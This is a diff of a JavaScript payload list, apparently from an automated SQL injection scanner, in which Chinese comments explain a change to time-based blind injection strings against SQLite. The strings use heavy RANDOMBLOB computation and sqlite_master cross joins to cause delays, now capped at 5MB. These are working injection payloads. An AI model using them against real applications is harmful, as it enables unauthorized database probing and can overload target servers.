@@ -93,9 +93,10 @@ export const sqlitePayloads = {
     // —— 扩容：LIKE 重运算时间盲注（SQLite 无原生 SLEEP，用 LIKE(大块 HEX(RANDOMBLOB)) 重运算近似延迟；/**/ 注释变体）——
     // 注：RANDOMBLOB(50000000) 已移入 destructive.js（risk≥3 门控）。
     // —— 深度扩容：RANDOMBLOB 重运算规模变体 + 5 表交叉积（伪延迟）——
-    "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000))))-- -",
-    "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(25000000))))-- -",
-    "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({SLEEP}0000000))))/**/",
+    // [P1 批次 2026-09-08] 降杀伤夹顶 5MB：10MB/25MB 变体在低端目标上 CPU 重运算可 >10s
+    // 熔断超时（与 TIME_VECTORS.SQLite 同口径）；延迟区分度在 5MB 内已足够（阈值 800ms）。
+    "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000))))-- -",
+    "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(MIN(({SLEEP}*5000000),5000000)))))-- -",
     "{ORIG}' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d, sqlite_master e)-- -",
     // [SQLMAP-PARITY] cross join heavy cartesian（重查询延迟，无写操作）
     "{ORIG}' AND (SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d)>0-- -",
